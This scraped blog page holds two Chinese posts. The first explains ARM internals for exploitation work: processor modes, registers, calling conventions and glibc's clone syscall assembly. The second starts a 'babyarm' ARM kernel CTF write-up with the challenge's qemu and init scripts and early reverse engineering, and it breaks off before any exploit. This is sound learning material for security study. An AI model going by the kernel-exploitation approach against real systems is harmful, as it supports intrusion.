              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>之前已经写过一篇关于 ARM 的博客了：<a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/">ARM pwn 环境搭建+基础入门 | Pwn进你的心 (ywhkkx.github.io)</a> </p>
<p>主要简述了以下各方面的知识：（主要是32位）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#ARM-架构简述">1. ARM 架构简述</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#搭建环境">2. 搭建环境</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#数据类型和寄存器">3. 数据类型和寄存器</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#ARM-amp-THUMB">4. ARM &amp; THUMB</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#ARM-指令集">5. ARM 指令集</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#加载和存储">6. 加载和存储</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#条件执行">7. 条件执行</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#栈和函数">8. 栈和函数</a></li>
</ul>
<h2 id="ARM-的七种工作模式"><a href="#ARM-的七种工作模式" class="headerlink" title="ARM 的七种工作模式"></a>ARM 的七种工作模式</h2><img src="/2023/03/15/ARM%20pwn%20%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/3731ce6cc46fad7a4f55b593903b3e5c-1682921679589.png" class title="3731ce6cc46fad7a4f55b593903b3e5c"> 
<ul>
<li>用户模式（USR）：正常程序执行模式，不能直接切换到其他模式</li>
<li>系统模式（SYS）：运行操作系统的特权任务，与用户模式类似，但具有可以直接切换到其他模式等特权</li>
<li>快中断模式（FIQ）：支持高速数据传输及通道处理，FIQ异常响应时进入此模式</li>
<li>中断模式（IRQ）：用于通用中断处理，IRQ异常响应时进入此模式</li>
<li>管理模式（SVC）：操作系统保护模式，系统复位和软件中断响应时进入此模式（由系统调用执行软中断SWI命令触发）</li>
<li>中止模式（ABT）：用于支持虚拟内存和/或存储器保护，在ARM7TDMI没有大用处</li>
<li>未定义模式（UND）：支持硬件协处理器的软件仿真，未定义指令异常响应时进入此模式</li>
</ul>
<p>在所有的寄存器中，有些是各模式共用同一个物理寄存器，有些寄存器是各个模式自己拥有独立的物理寄存器</p>
<p>CPSR 和 SPSR 都是程序状态寄存器，其中 SPSR 是用来保存中断前的 CPSR 中的值，以便在中断返回之后恢复处理器程序状态</p>
<h2 id="ARM-的-NEON-寄存器"><a href="#ARM-的-NEON-寄存器" class="headerlink" title="ARM 的 NEON 寄存器"></a>ARM 的 NEON 寄存器</h2><p><strong>常规寄存器</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>32位</th>
<th>64位</th>
<th>别名</th>
<th style="text-align:left">目的</th>
</tr>
</thead>
<tbody>
<tr>
<td>R0-R6</td>
<td>X0-X7</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td></td>
<td>X8</td>
<td>–</td>
<td style="text-align:left">保存子程序返回值</td>
</tr>
<tr>
<td>R7</td>
<td></td>
<td>–</td>
<td style="text-align:left">持有系统调用号</td>
</tr>
<tr>
<td></td>
<td>X9-X15</td>
<td>临时寄存器</td>
<td style="text-align:left">子程序使用时不需要保存</td>
</tr>
<tr>
<td>R8-R10</td>
<td>X19-X28</td>
<td>临时寄存器</td>
<td style="text-align:left">子程序使用时必须保存</td>
</tr>
<tr>
<td></td>
<td>X18</td>
<td>–</td>
<td style="text-align:left">记录平台信息</td>
</tr>
<tr>
<td>R11</td>
<td>X29</td>
<td>FP</td>
<td style="text-align:left">帧指针</td>
</tr>
<tr>
<td>R12</td>
<td>X16-X17</td>
<td>IP</td>
<td style="text-align:left">程序内呼叫</td>
</tr>
<tr>
<td>R13</td>
<td>X31</td>
<td>SP</td>
<td style="text-align:left">栈指针</td>
</tr>
<tr>
<td>R14</td>
<td>X30</td>
<td>LR</td>
<td style="text-align:left">链接注册</td>
</tr>
<tr>
<td>R15</td>
<td></td>
<td>PC</td>
<td style="text-align:left">程序计数器</td>
</tr>
<tr>
<td>CPSR</td>
<td>CPSR</td>
<td>–</td>
<td style="text-align:left">当前程序状态寄存器</td>
</tr>
<tr>
<td>SPSR</td>
<td>SPSR</td>
<td>–</td>
<td style="text-align:left">程序状态保存寄存器</td>
</tr>
</tbody>
</table>
</div>
<p><strong>NEON 寄存器</strong></p>
<p>ARM NEON 技术本质上是一种高级的单指令多数据（SIMD）架构扩展，这种扩展仅在一些 ARMv7-A 和 ARMv7-R 架构以及 ARMv8 架构上支持：</p>
<ul>
<li>从 ARMv5 架构开始引入 VFP（vector-floating-point） 指令扩展，可以通过使用短向量指令来加速浮点计算</li>
<li>从 ARMv7 架构开始引入 NEON 技术，NEON 技术同样是依靠向量指令来加速计算，VFP 向量指令加速的模式被弃用，因此 VFP 单元有时也称之为 FPU（Floating Point Unit）单元 </li>
</ul>
<p>NEON 寄存器主要是用来存放包含相同数据类型元素的向量：</p>
<ul>
<li>在 ARMv7 架构中（32位）， 一共有16个128位寄存器，一个128位寄存器又可以分为两个64位寄存器，以此类推</li>
<li>在 ARMv8 架构中（64位），所有寄存器的总数相比 ARMv7 架构翻倍 </li>
<li>Q 寄存器：128位寄存器</li>
<li>D 寄存器：64位寄存器</li>
<li>S 寄存器：32位寄存器</li>
<li>H 寄存器：16位寄存器</li>
<li>B 寄存器：8位寄存器</li>
</ul>
<p>32位下 NEON 寄存器：</p>
<ul>
<li>32个S寄存器，S0~S31（单字，32bit）</li>
<li>32个D寄存器，D0~D31（双字，64bit）</li>
<li>16个Q寄存器，Q0~Q15（四字，128bit）</li>
</ul>
<p>64位下 NEON 寄存器：</p>
<ul>
<li>32个B寄存器，B0~B31（字节，8bit）</li>
<li>32个H寄存器，H0~H31（半字，16bit）</li>
<li>32个S寄存器，S0~S31（单字，32bit）</li>
<li>32个D寄存器，D0~D31（双字，64bit）</li>
<li>32个Q寄存器，V0~V31（四字，128bit）</li>
</ul>
<h2 id="ARM-的函数调用"><a href="#ARM-的函数调用" class="headerlink" title="ARM 的函数调用"></a>ARM 的函数调用</h2><p><strong>测试案例一如下：（64位：循环+选择）</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [xsp+2Ch] [xbp+2Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从 main 函数开始到 for 循环之间的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; __unwind &#123;</span><br><span class="line">STP             X29, X30, [SP,#var_30]!		/* 将X29,X30写入[SP+var_30] */</span><br><span class="line">MOV             X29, SP					   /* 将SP写入X29 */</span><br><span class="line">STR             W0, [SP,#0x30+argc]			/* 将W0写入[SP+0x30+argc] */</span><br><span class="line">STR             X1, [SP,#0x30+argv]</span><br><span class="line">STR             WZR, [SP,#0x30+i]</span><br><span class="line">B               loc_794</span><br></pre></td></tr></table></figure>
<ul>
<li>ARM 的 MOV 只支持在寄存器之间转换数据，从内存到 CPU 之间的移动只能通过 LDR/STR 指令来完成 </li>
<li>STP 相当于两个 STR</li>
<li>W0 就是 X0 的低32位（类似于 RAX 和 EAX 之间的关系）</li>
<li>ARMv8 有两个0寄存器，分别是 WZR 和 XZR（零寄存器内容为 “0”）</li>
<li>B 指令是相对跳转指令，根据当前PC寄存器的值加上偏移来实现跳转</li>
</ul>
<p>从 for 循环到 if 语句的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loc_794</span><br><span class="line">LDR             W0, [SP,#0x30+i]		/* 读取计数器i */</span><br><span class="line">CMP             W0, #9				   /* 对比计数器i是否到达目标值 */</span><br><span class="line">B.LE            loc_76C				   /* 判断上面cmp结果是否小于等于,跳转标号 */</span><br><span class="line">MOV             W0, #0</span><br><span class="line">LDP             X29, X30, [SP+0x30+var_30],#0x30	/* 将[SP+var_30]写回X29,X30 */</span><br><span class="line">RET</span><br></pre></td></tr></table></figure>
<ul>
<li>X0 通常作为计数器（地位相当于 x86 中的 RAX）</li>
<li>B，B.LE 这两个跳转构成了循环</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loc_76C</span><br><span class="line">LDR             W0, [SP,#0x30+i]</span><br><span class="line">AND             W0, W0, #1				</span><br><span class="line">CMP             W0, #0					/* 执行判断语句 */</span><br><span class="line">B.NE            loc_788					/* 判断上面cmp结果是否不等于,跳转标号 */</span><br><span class="line">ADRL            X0, aA  ; s				/* 装载.puts的参数 */</span><br><span class="line">BL              .puts					/* 转移并连接(调用子程序) */</span><br><span class="line">loc_788</span><br><span class="line">LDR             W0, [SP,#0x30+i]		/* 从栈中获取i */</span><br><span class="line">ADD             W0, W0, #1				/* 更新计数器i */</span><br><span class="line">STR             W0, [SP,#0x30+i]		/* 把i放回栈中 */</span><br></pre></td></tr></table></figure>
<ul>
<li>B.NE 构成了选择</li>
</ul>
<p><strong>测试案例二如下：（64位：函数调用）</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [xsp+24h] [xbp+24h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      A(<span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x60</span>, i + <span class="number">10</span>, i + <span class="number">20</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数 A 调用之前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x5500000814</span> &lt;main+<span class="number">64</span>&gt;     ldr    w7, [sp, #<span class="number">0x2c</span>]</span><br><span class="line">  <span class="number">0x5500000818</span> &lt;main+<span class="number">68</span>&gt;     ldr    w6, [sp, #<span class="number">0x28</span>]</span><br><span class="line">  <span class="number">0x550000081c</span> &lt;main+<span class="number">72</span>&gt;     mov    w5, #<span class="number">0x60</span></span><br><span class="line">  <span class="number">0x5500000820</span> &lt;main+<span class="number">76</span>&gt;     mov    w4, #<span class="number">0x50</span></span><br><span class="line">  <span class="number">0x5500000824</span> &lt;main+<span class="number">80</span>&gt;     mov    w3, #<span class="number">0x40</span></span><br><span class="line">  <span class="number">0x5500000828</span> &lt;main+<span class="number">84</span>&gt;     mov    w2, #<span class="number">0x30</span></span><br><span class="line">  <span class="number">0x550000082c</span> &lt;main+<span class="number">88</span>&gt;     mov    w1, #<span class="number">0x20</span></span><br><span class="line">  <span class="number">0x5500000830</span> &lt;main+<span class="number">92</span>&gt;     mov    w0, #<span class="number">0x10</span></span><br><span class="line">► <span class="number">0x5500000834</span> &lt;main+<span class="number">96</span>&gt;     bl     #A                 &lt;A&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>前6个参数分别放入 X0-X5 中，后续的参数从右往左依次入栈</li>
</ul>
<p>函数 A 结束之前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x55000007c8</span> &lt;A+<span class="number">116</span>&gt;       nop    </span><br><span class="line">  <span class="number">0x55000007cc</span> &lt;A+<span class="number">120</span>&gt;       ldp    x29, x30, [sp], #<span class="number">0x40</span></span><br><span class="line">► <span class="number">0x55000007d0</span> &lt;A+<span class="number">124</span>&gt;       ret    </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5501811f50</span><span class="number">-0x40</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5501811f10</span> —▸ <span class="number">0x5501811f50</span> —▸ <span class="number">0x5501811f80</span> —▸ <span class="number">0x5501812090</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5501811f18</span> —▸ <span class="number">0x5500000838</span> (main+<span class="number">100</span>) ◂— adrp   x0, #<span class="number">0x5500000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>ldp  x29, x30, [sp]</code> 会恢复调用者 main 函数的 X29(FP)，X30(LD)</li>
<li>后面的 <code>#0x40</code> 会使 <code>sp+0x40</code></li>
</ul>
<p>函数 A 结束之后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X29  <span class="number">0x5501811f50</span> —▸ <span class="number">0x5501811f80</span> —▸ <span class="number">0x5501812090</span> ◂— <span class="number">0x0</span></span><br><span class="line">X30  <span class="number">0x5500000838</span> (main+<span class="number">100</span>) ◂— adrp   x0, #<span class="number">0x5500000000</span></span><br></pre></td></tr></table></figure>
<h2 id="ARM-的系统调用"><a href="#ARM-的系统调用" class="headerlink" title="ARM 的系统调用"></a>ARM 的系统调用</h2><p>先看两个 libc 函数触发 ARM 系统调用的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clone</span><span class="params">(<span class="keyword">int</span> (*func)(<span class="keyword">void</span>*),<span class="keyword">void</span> *child_stack,<span class="keyword">int</span> flags,<span class="keyword">void</span> *func_arg,....)</span></span>;</span><br></pre></td></tr></table></figure>
<p>32位 arm：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(__clone)</span><br><span class="line">	@ sanity check args</span><br><span class="line">	cmp	r0, #0 /* 检查第一个参数 */</span><br><span class="line">	@ align sp</span><br><span class="line">	and	r1, r1, #-8 /* 使child_stack对齐 */</span><br><span class="line">	ite	ne 		/* If-Then-Else接下来的两条指令条件执行(条件为:不相等) */</span><br><span class="line">	cmpne	r1, #0				/* If Then如果ne成立,执行cmp,不成立则该条不执行 */</span><br><span class="line">	moveq	r0, #-EINVAL		/* Else:如果eq成立,执行mov,不成立则该条不执行 */</span><br><span class="line">	beq	PLTJMP(syscall_error)	 /* 如果eq成立,执行beq,不成立则该条不执行 */</span><br><span class="line"></span><br><span class="line">	@ insert the args onto the new stack</span><br><span class="line">	str	r3, [r1, #-4]!</span><br><span class="line">	str	r0, [r1, #-4]!</span><br><span class="line"></span><br><span class="line">	@ do the system call</span><br><span class="line">	@ get flags</span><br><span class="line">	mov	r0, r2</span><br><span class="line">	mov	ip, r2</span><br><span class="line">	@ new sp is already in r1</span><br><span class="line">	push	&#123;r4, r7&#125;</span><br><span class="line">	cfi_adjust_cfa_offset (8)		/* 发出一个操作码,告诉调试器CFA与假定的CFA(sp)的偏移量为8 */</span><br><span class="line">	cfi_rel_offset (r4, 0)			/* 告诉调试器R4的原始值可以在新调整的CFA的偏移量0处找到 */</span><br><span class="line">	cfi_rel_offset (r7, 4)			/* 告诉调试器R7的原始值可以在新调整的CFA的偏移量4处找到 */</span><br><span class="line">	ldr	r2, [sp, #8]</span><br><span class="line">	ldr	r3, [sp, #12]</span><br><span class="line">	ldr	r4, [sp, #16]</span><br><span class="line">	ldr	r7, =SYS_ify(clone)			/* R7负责持有系统调用号 */</span><br><span class="line">	swi	0x0						   /* 触发异步异常 */</span><br><span class="line">	cfi_endproc						/* 定义函数结束 */</span><br><span class="line">	cmp	r0, #0</span><br><span class="line">	beq	1f</span><br><span class="line">	pop	&#123;r4, r7&#125;</span><br><span class="line">	blt	PLTJMP(C_SYMBOL_NAME(__syscall_error))</span><br><span class="line">	RETINSTR(, lr)</span><br><span class="line"></span><br><span class="line">	cfi_startproc</span><br><span class="line">PSEUDO_END (__clone)</span><br></pre></td></tr></table></figure>
<ul>
<li>系统调用会引起处理器模式切换 USER 切换到 SVC，而 SVC 下的 SP 和 USER 模式的 SP 是不同的</li>
<li>因此系统调用无法使用栈传入参数，需要将所有的参数通过寄存器 R0-R5 传递</li>
</ul>
<p>64位 aarch64：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(__clone)</span><br><span class="line">	/* Save args for the child.  */</span><br><span class="line">	mov	x10, x0</span><br><span class="line">	mov	x11, x2</span><br><span class="line">	mov	x12, x3</span><br><span class="line"></span><br><span class="line">	/* Sanity check args.  */</span><br><span class="line">	mov	x0, #-EINVAL</span><br><span class="line">	cbz	x10, .Lsyscall_error	/* 如果X10的值为&#x27;0&#x27;,则跳转Lsyscall_error */</span><br><span class="line">	cbz	x1, .Lsyscall_error		/* 如果X1的值为&#x27;0&#x27;,则跳转Lsyscall_error */</span><br><span class="line"></span><br><span class="line">	/* Do the system call.  */</span><br><span class="line">	/* X0:flags, x1:newsp, x2:parenttidptr, x3:newtls, x4:childtid.  */</span><br><span class="line">	mov	x0, x2                  /* flags  */</span><br><span class="line">	/* New sp is already in x1.  */</span><br><span class="line">	mov	x2, x4			/* ptid  */</span><br><span class="line">	mov	x3, x5			/* tls  */</span><br><span class="line">	mov	x4, x6			/* ctid  */</span><br><span class="line">	mov	x8, #SYS_ify(clone)</span><br><span class="line">	svc	0x0</span><br><span class="line"></span><br><span class="line">	cmp	x0, #0</span><br><span class="line">	beq	thread_start</span><br><span class="line">	blt	.Lsyscall_error</span><br><span class="line">	RET</span><br><span class="line">PSEUDO_END (__clone)</span><br></pre></td></tr></table></figure>
<ul>
<li>参数传递依靠 X0-X6</li>
</ul>
<p>svc 和 swi 都是 supervisor call 指令，都是系统调用：</p>
<ul>
<li>在 armv7 之前，用的都是 swi，触发异步异常，进入 <code>vector_swi</code> 异常向量表<ul>
<li>当异步异常产生后，程序会抛出一个信号使异常处理程序进入 CPU 的等待队列，然后由 CPU 在合适的时机去运行异常处理程序</li>
</ul>
</li>
<li>在 armv8-arch64 架构下，抛弃 swi 改用 svc，触发的是同步异常，进入同步异常向量表 <code>el1_sync</code><ul>
<li>当同步异常产生后，指令流会立刻进入异常处理流程，CPU 立刻执行异常处理程序</li>
</ul>
</li>
<li>如果不纠结 CPU 的处理过程，就可以把 swi 和 svc 当成是一回事，只是用的向量表不同而已</li>
</ul>
<p>当通过系统调用进入内核的时候，内核会进行一系列初始化操作，在内核栈上形成如下的用户空间现场： </p>
<img src="/2023/03/15/ARM%20pwn%20%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/750976682a217082e25cd506fb8c2501-1682921679590.png" class title="750976682a217082e25cd506fb8c2501"> 
<ul>
<li><code>pt_regs</code>：封装了需要在内核入口中保存的最少的状态信息，在系统崩溃时将会提供 debug 信息</li>
<li><code>thread_info</code>：存储当前进程的基本信息，包括进程描述符 <code>task_struct</code></li>
</ul>
<p>执行完具体的系统调用代码后，程序会依靠 <code>pt_regs</code> 的数据恢复用户态进程的上下文</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/14/ARM%20kernel%20pwn%E5%88%9D%E6%8E%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/14/ARM%20kernel%20pwn%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">ARM kernel pwn初探</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-14 23:41:45" itemprop="dateCreated datePublished" datetime="2023-03-14T23:41:45+08:00">2023-03-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-30 17:59:37" itemprop="dateModified" datetime="2023-04-30T17:59:37+08:00">2023-04-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babyarm 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">timeout --foreground 60 qemu-system-aarch64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -machine virt \</span><br><span class="line">    -cpu max \</span><br><span class="line">    -kernel ./Image \</span><br><span class="line">    -append &quot;console=ttyAMA0 loglevel=3 oops=panic panic=1&quot; \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
<ul>
<li>没有给定<code>nokaslr</code>，默认开启地址随机化 </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/demo.ko</span><br><span class="line">chown -R 1000:1000 /home/pwn</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line"></span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<ul>
<li>dmesg_restrict</li>
<li>kptr_restrict</li>
<li>perf_event_paranoid</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>IDA 分析内核模块发现就只有 <code>device_write</code> 和 <code>device_read</code> 有用，但这两个函数都很乱</p>
<p>再加上对 ARM 架构不熟悉，逆向的过程花费了我不少时间，下面是我的思考过程：</p>
<p>函数 <code>device_write</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 v21; <span class="comment">// [xsp+B8h] [xbp+B8h]</span></span><br><span class="line"></span><br><span class="line">StatusReg = _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">v21 = *(_QWORD *)(StatusReg + <span class="number">0x480</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>从位置上开看 v21 应该是 canary</li>
